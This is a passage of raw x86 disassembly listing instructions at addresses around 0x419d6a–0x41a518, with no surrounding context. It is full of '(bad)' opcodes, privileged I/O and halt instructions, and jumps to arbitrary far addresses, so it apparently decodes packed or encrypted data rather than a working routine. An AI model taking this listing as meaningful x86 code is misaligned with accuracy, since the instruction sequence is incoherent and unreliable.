  419d6a:	inc    ecx
  419d6b:	out    dx,eax
  419d6c:	pop    edx
  419d6d:	in     al,dx
  419d6e:	inc    esi
  419d6f:	clc    
  419d70:	stc    
  419d71:	xchg   edx,eax
  419d72:	dec    eax
  419d73:	mov    ch,0xca
  419d75:	stos   BYTE PTR es:[edi],al
  419d76:	ret    0x1b15
  419d79:	sub    DWORD PTR [eax+0x4c],0x39
  419d7d:	pop    ds
  419d7e:	stos   DWORD PTR es:[edi],eax
  419d7f:	mov    ebp,0x1151d52b
  419d84:	daa    
  419d85:	fsubr  DWORD PTR [ebx+0x40]
  419d88:	fistp  DWORD PTR [ebx+eax*2]
  419d8b:	or     DWORD PTR [eax],eax
  419d8d:	(bad)  
  419d8e:	xlat   BYTE PTR ds:[ebx]
  419d8f:	cli    
  419d90:	pop    esi
  419d91:	push   ecx
  419d92:	mov    bl,0x6e
  419d94:	xchg   esi,eax
  419d95:	pusha  
  419d96:	jno    0x419d5d
  419d98:	sub    edx,DWORD PTR [edx+0x14]
  419d9b:	and    bl,bl
  419d9d:	cdq    
  419d9e:	jbe    0x419dbf
  419da0:	adc    DWORD PTR [eax+0x57],eax
  419da3:	jb     0x419d79
  419da5:	mov    dl,0xec
  419da7:	inc    ebp
  419da8:	ret    0x14a6
  419dab:	adc    BYTE PTR [esi-0x5f],ah
  419dae:	les    ebx,FWORD PTR [ecx]
  419db0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419db1:	xchg   DWORD PTR [ecx],esp
  419db3:	jmp    0x7701:0xd996c7a
  419dba:	xor    DWORD PTR [edi+0x2a17eeae],0x55d67c7d
  419dc4:	sbb    DWORD PTR [esi+0x79881114],0x9a3502a6
  419dce:	enter  0xccc6,0x51
  419dd2:	inc    ecx
  419dd3:	repz call 0xabecd888
  419dd9:	mov    al,0x1c
  419ddb:	dec    eax
  419ddc:	mov    DWORD PTR ds:0xee3474ab,ebx
  419de2:	mov    dh,0xa6
  419de4:	jp     0x419d95
  419de6:	mov    eax,ds:0x2df4599
  419deb:	rol    BYTE PTR [eax],0xc4
  419dee:	sbb    edx,DWORD PTR ds:0x34d22bbc
  419df4:	push   ss
  419df5:	mov    esp,0x296d85e
  419dfa:	xchg   edx,eax
  419dfb:	out    dx,al
  419dfc:	pop    eax
  419dfd:	fdivr  QWORD PTR [edi+0x50]
  419e00:	xor    ecx,edx
  419e02:	add    al,0x8c
  419e04:	adc    BYTE PTR [edx+edi*2-0x4534fca],cl
  419e0b:	loop   0x419df7
  419e0d:	jmp    0x419e75
  419e0f:	xor    DWORD PTR ds:0xfa662c15,0xd1565cc
  419e19:	and    al,0x66
  419e1b:	xchg   bh,bl
  419e1d:	sbb    al,BYTE PTR [edi+0x43363f47]
  419e23:	dec    ecx
  419e24:	mov    al,0xb6
  419e26:	js     0x419e26
  419e28:	je     0x419e17
  419e2a:	call   0xd6bf2cc1
  419e2f:	jg     0x419db7
  419e31:	xor    DWORD PTR [eax],ebp
  419e33:	mov    BYTE PTR [ebp-0x5141baf2],bl
  419e39:	sti    
  419e3a:	xchg   esp,eax
  419e3b:	cmp    BYTE PTR [esi+0x7e],bl
  419e3e:	or     eax,0x7cc49f97
  419e43:	sub    BYTE PTR [ecx-0x52b0f90],cl
  419e49:	fmul   QWORD PTR [edi-0x5bd46ec1]
  419e4f:	pop    esp
  419e50:	and    DWORD PTR [ecx],esp
  419e52:	add    al,0xa8
  419e54:	cdq    
  419e55:	(bad)
  419e59:	rol    dl,1
  419e5b:	push   ebp
  419e5c:	or     eax,0x6abd0e69
  419e61:	pusha  
  419e62:	icebp  
  419e63:	jne    0x419df6
  419e65:	cwde   
  419e66:	pop    esp
  419e67:	sub    eax,0x683c2657
  419e6c:	dec    edx
  419e6d:	aaa    
  419e6e:	loopne 0x419e68
  419e70:	iret   
  419e71:	stos   DWORD PTR es:[edi],eax
  419e72:	ins    BYTE PTR es:[edi],dx
  419e73:	inc    ecx
  419e74:	mov    dh,0x35
  419e76:	retf   0x4c9d
  419e79:	xchg   ecx,eax
  419e7a:	in     eax,0x8
  419e7c:	xor    ch,ch
  419e7e:	cwde   
  419e7f:	inc    edi
  419e80:	pop    ebx
  419e81:	dec    ecx
  419e82:	inc    ecx
  419e83:	cmp    edi,DWORD PTR [ebp-0x18695247]
  419e89:	call   0xa81d:0xa21612b7
  419e90:	mov    bl,cl
  419e92:	inc    edx
  419e93:	push   ecx
  419e94:	push   esi
  419e95:	pop    ss
  419e96:	xor    ecx,esp
  419e98:	imul   edx,DWORD PTR [ebx+0x5a99737],0x3a
  419e9f:	push   edi
  419ea0:	cmp    eax,DWORD PTR [ecx+ecx*8]
  419ea3:	cmp    esi,DWORD PTR [edx-0x9857781]
  419ea9:	out    dx,al
  419eaa:	fwait
  419eab:	ins    DWORD PTR es:[edi],dx
  419eac:	mov    ss,WORD PTR [esi]
  419eae:	pop    ds
  419eaf:	push   es
  419eb0:	(bad)  
  419eb1:	loop   0x419e89
  419eb3:	push   ds
  419eb4:	popf   
  419eb5:	jb     0x419ee6
  419eb7:	pop    ecx
  419eb8:	cmc    
  419eb9:	sar    dh,0x45
  419ebc:	es arpl cx,ax
  419ebf:	mov    eax,0xbf9d354a
  419ec4:	repnz push ebx
  419ec6:	fs enter 0x9f81,0xec
  419ecb:	test   al,0xfd
  419ecd:	hlt    
  419ece:	loop   0x419e56
  419ed0:	jmp    0x42add4c3
  419ed5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ed6:	pop    ebx
  419ed7:	mov    edx,0x58e3e5eb
  419edc:	out    0xf1,al
  419ede:	inc    edi
  419edf:	push   edx
  419ee0:	enter  0x4953,0x19
  419ee4:	rcr    BYTE PTR [ecx],1
  419ee6:	das    
  419ee7:	push   edi
  419ee8:	sbb    edi,ebx
  419eea:	and    al,0x48
  419eec:	inc    eax
  419eed:	mov    edx,0xd57a148c
  419ef2:	retf   
  419ef3:	cs out 0xaf,al
  419ef6:	mov    ds:0x1ca44361,al
  419efb:	adc    BYTE PTR [ecx],ah
  419efd:	and    dh,BYTE PTR [edx+0x151dc861]
  419f03:	push   0x2b
  419f05:	mov    dh,0x8d
  419f07:	add    eax,0x7d4c9b1d
  419f0c:	stos   DWORD PTR es:[edi],eax
  419f0d:	mov    al,ds:0xdad46e3d
  419f12:	push   ss
  419f13:	iret   
  419f14:	iret   
  419f15:	fnstcw WORD PTR [edx-0x4d5f8f67]
  419f1b:	push   ds
  419f1c:	in     eax,dx
  419f1d:	scas   eax,DWORD PTR es:[edi]
  419f1e:	lods   al,BYTE PTR ds:[esi]
  419f1f:	lods   eax,DWORD PTR ds:[esi]
  419f20:	shr    BYTE PTR [ecx-0x6d22bc76],1
  419f26:	mov    ebx,0xd6719455
  419f2b:	call   0xbeda:0x7c8c2e9f
  419f32:	mov    edx,DWORD PTR [eax+0xe]
  419f35:	imul   ecx,edx,0xffffffce
  419f38:	pop    ebx
  419f39:	jmp    0xca4a:0x7211b39f
  419f40:	dec    esi
  419f41:	xor    al,0xe3
  419f43:	sub    BYTE PTR [eax-0x541e1ea1],0x34
  419f4a:	push   cs
  419f4b:	sub    BYTE PTR [ebx+0x45],cl
  419f4e:	jbe    0x419f52
  419f50:	hlt    
  419f51:	repnz xchg esp,eax
  419f53:	mov    dh,0xba
  419f55:	ja     0x419f39
  419f57:	pop    ds
  419f58:	pop    esp
  419f59:	inc    ecx
  419f5a:	dec    ebp
  419f5b:	dec    ecx
  419f5c:	pushf  
  419f5d:	nop
  419f5e:	sub    BYTE PTR [edi+edi*8-0x5934379d],ah
  419f65:	in     al,0xcf
  419f67:	lds    esi,FWORD PTR [eax-0x3c49b119]
  419f6d:	loopne 0x419f1f
  419f6f:	inc    esp
  419f70:	pop    ebp
  419f71:	and    eax,0x20847685
  419f76:	mul    BYTE PTR [esi+ecx*8-0x3d]
  419f7a:	mov    DWORD PTR [esi+0x50],edx
  419f7d:	shl    DWORD PTR ds:0x548b3714,0x66
  419f84:	push   eax
  419f85:	mov    edx,0x6ae3ca78
  419f8a:	dec    ebp
  419f8b:	test   DWORD PTR [ecx],0xe5748ca3
  419f91:	in     eax,0x9f
  419f93:	cmp    dl,BYTE PTR [eax]
  419f95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f96:	out    0xfe,al
  419f98:	outs   dx,BYTE PTR ds:[esi]
  419f99:	inc    edx
  419f9a:	shl    DWORD PTR [edi],1
  419f9c:	fisttp WORD PTR ds:0xf57e3b7c
  419fa2:	or     al,0x15
  419fa4:	xchg   ecx,eax
  419fa5:	xlat   BYTE PTR ds:[ebx]
  419fa6:	pop    ecx
  419fa7:	xchg   esi,eax
  419fa8:	push   esi
  419fa9:	adc    edi,DWORD PTR [ebx+0x21d6bc25]
  419faf:	je     0x419f80
  419fb1:	sub    BYTE PTR ds:0x169ff1fb,dh
  419fb7:	or     ecx,DWORD PTR ds:0x2fc8ba66
  419fbd:	push   ecx
  419fbe:	shl    BYTE PTR [edi],0x8c
  419fc1:	push   cs
  419fc2:	sub    al,0x9f
  419fc4:	and    al,0xff
  419fc6:	jecxz  0x419ffd
  419fc8:	ja     0x419fcc
  419fca:	retf   
  419fcb:	mov    edx,0xa6251605
  419fd0:	icebp  
  419fd1:	dec    ebp
  419fd2:	xor    al,dh
  419fd4:	adc    edx,DWORD PTR [ecx]
  419fd6:	cs push ds
  419fd8:	shl    BYTE PTR [edi+0xb],cl
  419fdb:	xchg   esp,eax
  419fdc:	sahf   
  419fdd:	cli    
  419fde:	dec    edx
  419fdf:	loope  0x41a01e
  419fe1:	sub    bh,BYTE PTR [esi]
  419fe3:	stc    
  419fe4:	test   eax,0x83cb0af
  419fe9:	sar    ch,1
  419feb:	shr    BYTE PTR [ebx-0x55e633d4],cl
  419ff1:	inc    esp
  419ff2:	fwait
  419ff3:	jno    0x41a00a
  419ff5:	push   eax
  419ff6:	push   edi
  419ff7:	mov    BYTE PTR [esp+edx*2+0x3e],bh
  419ffb:	test   BYTE PTR [esi+0x51914f5d],bl
  41a001:	rol    ch,cl
  41a003:	cs lahf 
  41a005:	xabort 0x9
  41a008:	xchg   esp,eax
  41a009:	mov    al,0x60
  41a00b:	hlt    
  41a00c:	outs   dx,DWORD PTR ds:[esi]
  41a00d:	mov    edi,0x212d1eef
  41a012:	push   edi
  41a013:	pop    ecx
  41a014:	push   edx
  41a015:	gs pop esi
  41a017:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a018:	sub    eax,0x73f35f50
  41a01d:	inc    ebp
  41a01e:	mov    dl,0x13
  41a020:	adc    al,0x43
  41a022:	loope  0x41a044
  41a024:	xchg   ecx,eax
  41a025:	xchg   esi,eax
  41a026:	pop    ebx
  41a027:	cmp    eax,ebp
  41a029:	push   edx
  41a02a:	loope  0x41a0ab
  41a02c:	rol    BYTE PTR [edi],cl
  41a02e:	add    dh,BYTE PTR [esp+edx*8-0x387421de]
  41a035:	retf   0xec39
  41a038:	loope  0x419feb
  41a03a:	shl    ecx,0x78
  41a03d:	arpl   WORD PTR [esi],cx
  41a03f:	jmp    0x332dad57
  41a044:	mov    esi,0xc6cb689a
  41a049:	out    dx,eax
  41a04a:	data16 mov cl,0xdc
  41a04d:	mov    WORD PTR [edx-0x24],?
  41a050:	fcmovnu st,st(1)
  41a052:	push   ebx
  41a053:	dec    ecx
  41a054:	sbb    ecx,DWORD PTR [edx+0x29]
  41a057:	mov    esp,0xff8cba7f
  41a05c:	adc    dh,BYTE PTR [eax-0x7b]
  41a05f:	daa    
  41a060:	gs inc ebx
  41a062:	(bad)  
  41a063:	mov    eax,0x9adf54c0
  41a068:	mov    ds:0x728e7355,eax
  41a06d:	dec    eax
  41a06e:	fbld   TBYTE PTR ds:0xb12ca51d
  41a074:	jnp    0x41a028
  41a076:	and    DWORD PTR [eax+edi*4],eax
  41a079:	outs   dx,DWORD PTR ds:[esi]
  41a07a:	int3   
  41a07b:	jg     0x41a027
  41a07d:	aas    
  41a07e:	jmp    0x41a093
  41a080:	mov    ds:0x91e68a82,al
  41a085:	sub    al,0x65
  41a087:	out    0x5b,al
  41a089:	inc    esp
  41a08a:	gs cs jns 0x41a05e
  41a08e:	out    0x2d,eax
  41a090:	add    al,0x8b
  41a092:	cs and al,0xc
  41a095:	push   ds
  41a096:	mov    edx,0x7cb3c8fb
  41a09b:	shl    BYTE PTR [ebx],1
  41a09d:	mov    ebp,0x24b4430a
  41a0a2:	pop    eax
  41a0a3:	loopne 0x41a0c7
  41a0a5:	mov    edx,0x620c7272
  41a0aa:	pop    edi
  41a0ab:	push   0x817e7698
  41a0b0:	bound  esp,QWORD PTR [ecx+0x42f6dfc8]
  41a0b6:	stos   DWORD PTR es:[edi],eax
  41a0b7:	fcom   DWORD PTR [ebp-0x48]
  41a0ba:	jo     0x41a06f
  41a0bc:	xlat   BYTE PTR ds:[ebx]
  41a0bd:	jl     0x41a0af
  41a0bf:	inc    ebp
  41a0c0:	test   eax,0x3cdc34b3
  41a0c5:	pop    edi
  41a0c6:	push   esi
  41a0c7:	and    ch,0x80
  41a0ca:	mov    ecx,0x3a05c1ad
  41a0cf:	inc    ecx
  41a0d0:	inc    ebx
  41a0d1:	adc    ebp,edi
  41a0d3:	cmp    eax,0xfb97fad7
  41a0d8:	cmp    al,0x5e
  41a0db:	pusha  
  41a0dc:	inc    ecx
  41a0dd:	jo     0x41a07d
  41a0df:	inc    edx
  41a0e0:	das    
  41a0e1:	sti    
  41a0e2:	inc    edi
  41a0e3:	iret   
  41a0e4:	mul    BYTE PTR [ecx-0x1e]
  41a0e7:	xor    eax,0xf89cb759
  41a0ec:	ds enter 0xa80e,0x85
  41a0f1:	not    edx
  41a0f3:	popa   
  41a0f4:	fisttp WORD PTR [esi+0x7e4b1cca]
  41a0fa:	popa   
  41a0fb:	push   ecx
  41a0fc:	sbb    ebp,edi
  41a0fe:	and    cl,bl
  41a100:	add    dh,BYTE PTR [edx]
  41a102:	jmp    0x3735468d
  41a107:	mov    eax,0xc4390d60
  41a10c:	loopne 0x41a0b8
  41a10e:	mov    ch,ah
  41a110:	xchg   ecx,eax
  41a111:	pop    ebx
  41a112:	sub    ebp,ebx
  41a114:	and    esp,ecx
  41a116:	jbe    0x41a14f
  41a118:	dec    ebp
  41a119:	add    DWORD PTR [edx],edi
  41a11b:	daa    
  41a11c:	xor    edi,DWORD PTR [ebx+0x3f]
  41a11f:	(bad)  
  41a120:	xchg   edx,eax
  41a121:	dec    esp
  41a122:	rol    DWORD PTR [eax+0x4c768ab7],1
  41a128:	adc    BYTE PTR [ecx],dl
  41a12a:	aaa    
  41a12b:	adc    cl,ah
  41a12d:	xchg   edx,eax
  41a12e:	sbb    eax,0x939f8e69
  41a133:	push   0x61
  41a135:	sbb    DWORD PTR [ebp+ebp*8-0x6589ac32],edx
  41a13c:	imul   edi,DWORD PTR ds:0x582e920d,0xffffffa0
  41a143:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a144:	mov    esi,0xf087804
  41a149:	call   0x2e408bf6
  41a14e:	imul   esi,eax,0xf18e0fba
  41a154:	scas   eax,DWORD PTR es:[edi]
  41a155:	ret    0x46a8
  41a158:	and    DWORD PTR [edx],ebx
  41a15a:	call   0x69f4:0x29fa6266
  41a161:	pop    ecx
  41a162:	push   ecx
  41a163:	mov    ah,BYTE PTR [edx-0x45e10608]
  41a169:	dec    esi
  41a16a:	bound  esp,QWORD PTR [ebp-0x1f185ff3]
  41a170:	jle    0x41a1d4
  41a172:	dec    eax
  41a173:	mov    ds:0xa512b27d,eax
  41a178:	mov    cl,0x65
  41a17a:	pop    ecx
  41a17b:	(bad)  
  41a17c:	out    dx,eax
  41a17d:	mov    BYTE PTR [esp-0x163a5b5],bl
  41a184:	lods   al,BYTE PTR ds:[esi]
  41a185:	test   eax,0x38504cba
  41a18a:	sub    DWORD PTR [ebx-0x67],0xffffffe4
  41a18e:	imul   ecx,DWORD PTR [ebp+0x41a0cdbe],0x67
  41a195:	fnstcw WORD PTR [eax-0x6fce1f11]
  41a19b:	mov    dh,0x72
  41a19d:	lahf   
  41a19e:	pop    esp
  41a19f:	add    DWORD PTR [ebx*4-0x1a2f4f2a],esp
  41a1a6:	enter  0x5269,0x87
  41a1aa:	jns    0x41a1c7
  41a1ac:	outs   dx,BYTE PTR ds:[esi]
  41a1ad:	xchg   ebp,eax
  41a1ae:	cmp    DWORD PTR [esp+ebp*4],esi
  41a1b1:	bound  esi,QWORD PTR [edi-0x23fd4115]
  41a1b7:	mov    esi,0xcdab8c68
  41a1bc:	lods   eax,DWORD PTR ds:[esi]
  41a1bd:	mov    al,0x48
  41a1bf:	outs   dx,DWORD PTR ds:[esi]
  41a1c0:	mov    esp,DWORD PTR [eax+0x6a40adb4]
  41a1c6:	push   ebx
  41a1c7:	pop    esp
  41a1c8:	scas   al,BYTE PTR es:[edi]
  41a1c9:	jno    0x41a166
  41a1cb:	push   edi
  41a1cc:	adc    al,0xd
  41a1ce:	lock jb 0x41a1f9
  41a1d1:	rcl    DWORD PTR [ecx+0x1b2f00e7],0x5e
  41a1d8:	sub    esp,DWORD PTR [ebp-0x76]
  41a1db:	scas   al,BYTE PTR es:[edi]
  41a1dc:	call   0x13746444
  41a1e1:	xor    BYTE PTR [edx+0x420f0f5c],bh
  41a1e7:	adc    DWORD PTR [edi],eax
  41a1e9:	loopne 0x41a1ec
  41a1eb:	cwde   
  41a1ec:	cdq    
  41a1ed:	ret    0x1d16
  41a1f0:	dec    esi
  41a1f1:	out    dx,eax
  41a1f2:	dec    eax
  41a1f3:	pop    esi
  41a1f4:	xor    dl,BYTE PTR [ebx+0x53]
  41a1f7:	hlt    
  41a1f8:	loope  0x41a276
  41a1fa:	daa    
  41a1fb:	sbb    al,BYTE PTR [edx]
  41a1fd:	push   eax
  41a1fe:	adc    DWORD PTR [ebx],ecx
  41a200:	mov    ah,0x26
  41a202:	mov    ecx,0x7a24c882
  41a207:	pop    edi
  41a208:	mov    al,0x7a
  41a20a:	mov    ah,0x50
  41a20c:	pop    ebx
  41a20d:	push   ds
  41a20e:	or     DWORD PTR [ebp+eax*4-0x19bd3dbc],esi
  41a215:	or     cl,BYTE PTR [esi]
  41a217:	or     DWORD PTR ds:0xa2de8522,ebp
  41a21d:	add    cl,BYTE PTR [eax+ebx*4+0x52]
  41a221:	neg    DWORD PTR ds:0xd29c8614
  41a227:	test   eax,0x37e9841d
  41a22c:	dec    edi
  41a22d:	or     DWORD PTR [ecx-0x5806ceaa],ecx
  41a233:	fs std 
  41a235:	mul    BYTE PTR [edx+0x39056365]
  41a23b:	rcr    ch,0xc7
  41a23e:	ret    0xa9d
  41a241:	sar    edi,1
  41a243:	sub    eax,esp
  41a245:	(bad)  
  41a246:	lock jne 0x41a212
  41a249:	dec    edi
  41a24a:	aaa    
  41a24b:	xor    DWORD PTR [eax-0xd],0x18bb9c70
  41a252:	out    dx,eax
  41a253:	bound  ebp,QWORD PTR [edx-0x4c857e40]
  41a259:	adc    edi,DWORD PTR [eax]
  41a25b:	mov    gs,WORD PTR ds:0xb75331a5
  41a261:	(bad)  
  41a262:	mov    ch,0xe
  41a264:	enter  0xe454,0x19
  41a268:	sbb    esi,DWORD PTR [esi-0x583730e2]
  41a26e:	not    BYTE PTR [ecx]
  41a270:	(bad)  
  41a271:	fistp  WORD PTR [esi+0xb]
  41a274:	and    eax,0xf9c17923
  41a279:	adc    al,0x1a
  41a27b:	jne    0x41a28a
  41a27d:	jp     0x41a2cf
  41a27f:	and    DWORD PTR [edx+0x39fd7bf1],edi
  41a285:	and    eax,0x93214be7
  41a28a:	mov    cl,0xf3
  41a28c:	pushw  ss
  41a28e:	js     0x41a22b
  41a290:	sub    eax,0xb2b9bf54
  41a295:	jmp    0xbbc4:0xf5519b6a
  41a29c:	mov    eax,ds:0xfef50903
  41a2a1:	add    al,0xa5
  41a2a3:	fnstenv [ebx+ecx*2+0x71]
  41a2a7:	add    DWORD PTR [edx+ecx*4],ebp
  41a2aa:	retf   
  41a2ab:	sbb    edi,ebx
  41a2ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a2ae:	in     eax,0x27
  41a2b0:	pop    ebx
  41a2b1:	jle    0x41a27c
  41a2b3:	cmp    BYTE PTR [eax+0x3ded6cdc],al
  41a2b9:	paddd  mm0,mm0
  41a2bc:	adc    ah,dh
  41a2be:	mov    ecx,0x959ac07c
  41a2c3:	mov    al,ds:0xba0a0de9
  41a2c8:	pop    edx
  41a2c9:	xchg   BYTE PTR [ecx+0x1fbd75e],dl
  41a2cf:	mov    ebp,0xf24ef081
  41a2d4:	ins    DWORD PTR es:[edi],dx
  41a2d5:	out    dx,al
  41a2d6:	stos   DWORD PTR es:[edi],eax
  41a2d7:	int3   
  41a2d8:	mov    esi,0x9043bc4e
  41a2dd:	ds pop ds
  41a2df:	enter  0x74a5,0x1f
  41a2e3:	iret   
  41a2e4:	sub    BYTE PTR es:[ebx+0x25e1831],dl
  41a2eb:	je     0x41a343
  41a2ed:	lds    esp,FWORD PTR ds:[edi+0x4d97c7ae]
  41a2f4:	adc    edi,edi
  41a2f6:	xor    DWORD PTR [ebp+0x4b85c39b],ebx
  41a2fc:	jmp    0x41a2f1
  41a2fe:	push   0x54
  41a300:	popf   
  41a301:	and    al,0xdf
  41a303:	sub    dl,ch
  41a305:	pushf  
  41a306:	mov    ah,0xd6
  41a308:	sub    eax,DWORD PTR [ebp+ebp*1+0x28]
  41a30c:	pop    ebp
  41a30d:	in     al,0x3d
  41a30f:	adc    DWORD PTR [ebx-0x5b6f2589],ebp
  41a315:	(bad)  [edx-0x15f2ce47]
  41a31b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a31c:	sahf   
  41a31d:	inc    ecx
  41a31e:	mov    ecx,0x5cf622d6
  41a323:	data16 mov al,0xc9
  41a326:	push   ds
  41a327:	xlat   BYTE PTR ds:[ebx]
  41a328:	adc    DWORD PTR [eax],ecx
  41a32a:	push   cs
  41a32b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a32c:	aad    0x6b
  41a32e:	sub    al,BYTE PTR [eax-0x1d]
  41a331:	mov    ecx,0x45ce126c
  41a336:	adc    DWORD PTR [esp+eax*4],ebx
  41a339:	cmp    dh,bl
  41a33b:	sub    eax,0xd2e5dae1
  41a340:	pop    es
  41a341:	adc    eax,0x9e588f39
  41a346:	fucomip st,st(5)
  41a348:	xor    bh,al
  41a34a:	mov    ch,0x61
  41a34c:	push   esp
  41a34d:	mov    dh,0x7a
  41a34f:	mov    dl,bl
  41a351:	in     al,0x26
  41a353:	neg    DWORD PTR [ebp+0x60]
  41a356:	mov    dl,0xa5
  41a358:	pop    eax
  41a359:	inc    esi
  41a35a:	rol    DWORD PTR fs:[edi+0x6f34f6c5],cl
  41a361:	dec    ecx
  41a362:	xchg   ecx,eax
  41a363:	pop    eax
  41a364:	(bad)  
  41a365:	dec    ebp
  41a366:	cld    
  41a367:	sbb    DWORD PTR [esi+edx*1+0x7475b4dc],ebp
  41a36e:	push   es
  41a36f:	shl    DWORD PTR fs:0x13703b91,cl
  41a376:	or     eax,0x748e10be
  41a37b:	cmp    eax,0xa8212399
  41a380:	jb     0x41a399
  41a382:	sti    
  41a383:	data16 mov WORD PTR [ebx-0x23],?
  41a387:	add    ebp,0x46
  41a38a:	enter  0xb84a,0x99
  41a38e:	cs jno 0x41a31a
  41a391:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a392:	push   0x38
  41a394:	add    al,0xe3
  41a396:	(bad)
  41a399:	pop    edi
  41a39a:	test   edi,ebx
  41a39c:	jmp    0x41a324
  41a39e:	cmp    BYTE PTR [ebx+0x34],0x17
  41a3a2:	mov    dh,ah
  41a3a4:	jl     0x41a353
  41a3a6:	mov    al,ch
  41a3a8:	repnz xchg esi,eax
  41a3aa:	sbb    cl,bh
  41a3ac:	sbb    eax,0xb6a8026b
  41a3b1:	pop    eax
  41a3b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a3b3:	(bad)  
  41a3b4:	sub    eax,0x602d0d1a
  41a3b9:	(bad)  
  41a3ba:	mov    ecx,0x123c3524
  41a3bf:	(bad)  
  41a3c0:	and    bl,dl
  41a3c2:	dec    ecx
  41a3c3:	(bad)  
  41a3c4:	adc    bh,BYTE PTR [ecx-0x33]
  41a3c7:	int3   
  41a3c8:	inc    edi
  41a3c9:	adc    al,BYTE PTR [ebx-0x4a538bad]
  41a3cf:	mov    ds:0x733e9489,eax
  41a3d4:	sahf   
  41a3d5:	repz scas eax,DWORD PTR es:[edi]
  41a3d7:	ror    DWORD PTR [esi],0x50
  41a3da:	div    ah
  41a3dc:	pop    ebx
  41a3dd:	std    
  41a3de:	sbb    al,0xe3
  41a3e0:	neg    DWORD PTR [edx]
  41a3e2:	dec    edx
  41a3e3:	es xor ebx,edi
  41a3e6:	js     0x41a44e
  41a3e8:	pop    ebp
  41a3e9:	out    0x9f,eax
  41a3eb:	das    
  41a3ec:	pop    ebx
  41a3ed:	mov    bh,0xca
  41a3ef:	mov    DWORD PTR ds:0x64763425,edi
  41a3f5:	cwde   
  41a3f6:	xchg   DWORD PTR [ecx-0x7b9b9c7a],eax
  41a3fc:	aaa    
  41a3fd:	sbb    DWORD PTR [eax+0x41dd2233],edi
  41a403:	pop    ecx
  41a404:	mov    bl,0x7f
  41a406:	test   al,0xb9
  41a408:	es cwde 
  41a40a:	push   ecx
  41a40b:	and    DWORD PTR [ecx+0x3ad837c6],esp
  41a411:	inc    edi
  41a412:	sub    BYTE PTR [eax+0xf],cl
  41a415:	add    esi,DWORD PTR [edx]
  41a417:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a418:	jmp    0x41a3b1
  41a41a:	or     edi,DWORD PTR ds:0x6bbfd339
  41a420:	cmc    
  41a421:	arpl   sp,di
  41a423:	adc    DWORD PTR [eax+ecx*2],eax
  41a426:	aad    0xe0
  41a428:	nop
  41a429:	lock test DWORD PTR [esi],0x8b1874e9
  41a430:	setns  bh
  41a433:	jo     0x41a44c
  41a435:	out    0xe1,al
  41a437:	cmp    esi,DWORD PTR [ebx+ecx*8-0x22]
  41a43b:	addr16 mov ebp,0xd17511b1
  41a441:	(bad)  
  41a442:	pop    ss
  41a443:	(bad)  
  41a444:	out    0xe0,eax
  41a446:	push   DWORD PTR ss:[ecx+0x63f537d9]
  41a44d:	push   edi
  41a44e:	push   edx
  41a44f:	lahf   
  41a450:	push   0xffffff93
  41a452:	(bad)  
  41a453:	cmp    eax,0x7a1f7a48
  41a458:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a459:	sbb    al,0xf9
  41a45b:	fidivr DWORD PTR [edi-0x26656af9]
  41a461:	add    cl,dh
  41a463:	sbb    eax,0x47651d5b
  41a468:	pop    edx
  41a469:	hlt    
  41a46a:	cmp    DWORD PTR [edi+0x7f],0x69c291c9
  41a471:	pop    esi
  41a472:	push   edx
  41a473:	sub    eax,0x695f3c67
  41a478:	hlt    
  41a479:	cmp    al,0x24
  41a47b:	test   al,0xbf
  41a47d:	and    eax,0xb97a590b
  41a482:	push   esi
  41a483:	lock mov ah,0x7b
  41a486:	bound  ebp,QWORD PTR [ebx+0x70]
  41a489:	int    0x52
  41a48b:	sbb    eax,ebx
  41a48d:	icebp  
  41a48e:	mov    dh,0x4d
  41a490:	(bad)  
  41a491:	lds    esp,FWORD PTR [ebx+0x30b3f1d8]
  41a497:	(bad)  
  41a498:	adc    al,0x8e
  41a49a:	cmp    eax,ebx
  41a49c:	pop    ebx
  41a49d:	mov    dh,0xf6
  41a49f:	xor    ah,BYTE PTR [ebx+0x761f050c]
  41a4a5:	fcmovnu st,st(0)
  41a4a7:	leave  
  41a4a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a4a9:	neg    ch
  41a4ab:	push   esp
  41a4ac:	or     al,0x51
  41a4ae:	pop    es
  41a4af:	pop    edi
  41a4b0:	inc    edx
  41a4b1:	mov    dh,0xd5
  41a4b3:	loope  0x41a4cd
  41a4b5:	dec    eax
  41a4b6:	stos   BYTE PTR es:[edi],al
  41a4b7:	xor    DWORD PTR [eax+0x70],ecx
  41a4ba:	sbb    eax,edi
  41a4bc:	daa    
  41a4bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a4be:	sar    eax,1
  41a4c0:	and    eax,DWORD PTR [esi+0xc17de06]
  41a4c6:	add    DWORD PTR [eax-0x64],0xbd17bd71
  41a4cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a4ce:	jmp    0x41a4b8
  41a4d0:	push   edi
  41a4d1:	mov    cl,0xe8
  41a4d3:	mov    edi,0xfaeb17d3
  41a4d8:	je     0x41a537
  41a4da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a4db:	dec    esi
  41a4dc:	dec    esp
  41a4dd:	add    eax,0xb0c8ac19
  41a4e2:	lea    esp,[edi+edi*1+0x38d68897]
  41a4e9:	aaa    
  41a4ea:	js     0x41a52d
  41a4ec:	adc    DWORD PTR [ebx],ecx
  41a4ee:	and    eax,ebx
  41a4f0:	cmp    eax,0x5834fe1e
  41a4f5:	xlat   BYTE PTR ds:[ebx]
  41a4f6:	and    eax,0x89837dc7
  41a4fb:	es clc 
  41a4fd:	repnz sbb al,0xf3
  41a500:	fldenv [esi+0x2a]
  41a503:	jmp    0x2794:0x73dbf1a
  41a50a:	lock fwait
  41a50c:	(bad)  
  41a50d:	sbb    BYTE PTR ds:[edi],al
  41a510:	fwait
  41a511:	or     edi,DWORD PTR [ecx]
  41a513:	mov    ds:0x831cb0a5,eax
  41a518:	scas   eax,DWORD PTR es:[edi]
